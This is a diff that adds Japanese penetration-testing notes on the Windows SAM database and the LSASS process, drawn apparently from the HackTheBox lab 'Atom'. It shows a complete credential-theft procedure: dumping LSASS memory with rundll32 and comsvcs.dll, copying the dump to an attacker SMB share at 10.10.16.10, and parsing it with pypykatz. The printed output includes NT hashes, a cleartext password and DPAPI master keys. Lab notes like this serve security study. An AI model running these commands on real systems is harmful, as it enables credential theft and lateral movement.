@@ -157,4 +157,86 @@
   Phineas:1002:aad3b435b51404eeaad3b435b51404ee:8eacdd67b77749e65d3b3d5c110b0969:::
   ```
 
+## SAMとLSASS
+* SAMは認証情報のハッシュを保存するデータベース
+
+* LSASSは、SAMにアクセスし、ユーザが入力した認証情報を検証するサービス
+
+* SAMからはNTLMハッシュ(パスワードハッシュ)が取得可能
+
+* LSASSのプロセスダンプからは、mimiktazを利用してパスワードそのものが取得可能
+
+* Htb: Atom
+
+  ```console
+  C:\Users\Public> tasklist | find "lsass.exe"
+  lsass.exe                      648 Services                   0     52,684 K
+  
+  C:\Users\Public> rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 648 C:\Users\Public\lsass.dmp full
+  
+  C:\Users\Public> dir
+   Volume in drive C has no label.
+   Volume Serial Number is 9793-C2E6
+  
+   Directory of C:\Users\Public
+  
+  09/09/2021  12:18 AM    <DIR>          .
+  09/09/2021  12:18 AM    <DIR>          ..
+  09/09/2021  12:18 AM    <DIR>          Documents
+  04/01/2021  04:42 AM    <DIR>          Downloads
+  09/09/2021  12:18 AM        53,953,098 lsass.dmp
+  04/01/2021  04:42 AM    <DIR>          Music
+  04/01/2021  04:42 AM    <DIR>          Pictures
+  04/01/2021  04:42 AM    <DIR>          Videos
+                 1 File(s)     53,953,098 bytes
+                 7 Dir(s)   5,421,928,448 bytes free
+  
+  C:\Users\Public> copy lsass.dmp \\10.10.16.10\public\
+  
+  
+  ┌─[✗]─[rio@parrot]─[~/Htb/Atom]
+  └──╼ $pypykatz lsa minidump lsass.dmp  | grep -A10 jason
+  INFO:root:Parsing file lsass.dmp
+  username jason
+  domainname ATOM
+  logon_server ATOM
+  logon_time 2021-09-09T01:55:47.859452+00:00
+  sid S-1-5-21-1199094703-3580107816-3092147818-1002
+  luid 325883
+          == MSV ==
+                  Username: jason
+                  Domain: ATOM
+                  LM: NA
+                  NT: 499aef4877d2d83e548a3e8f5f742ffe
+                  SHA1: b7c4ec1e6e52ee28c1511e90e80d18141113cc78
+                  DPAPI: NA
+          == WDIGEST [4f8fb]==
+                  username jason
+                  domainname ATOM
+                  password None
+                  password (hex)
+          == Kerberos ==
+                  Username: jason
+                  Domain: ATOM
+          == WDIGEST [4f8fb]==
+                  username jason
+                  domainname ATOM
+                  password None
+                  password (hex)
+          == CREDMAN [4f8fb]==
+                  luid 325883
+                  username ATOM\jason
+                  domain ATOM\jason
+                  password kidvscat_electron_@123
+                  password (hex)6b0069006400760073006300610074005f0065006c0065006300740072006f006e005f00400031003200330000000000
+          == DPAPI [4f8fb]==
+                  luid 325883
+                  key_guid 3a86d311-a5fe-4022-8640-4c8f01812ebe
+                  masterkey 832c18c5fe16007c66b8ca6a2e5722461b99976e9fa63689c4ec87b09ea4a960c2a445cb4ef1bedb7f095fa73d394c13594ad3e87da16306cd77231bd8bcaee1
+                  sha1_masterkey 3da278dc831da444899ea533296e84231e2f08ed
+          == DPAPI [4f8fb]==
+                  luid 325883
+                  key_guid a96996a9-5aec-4f82-a145-68ee2de5ea3f
+  ```
+
   
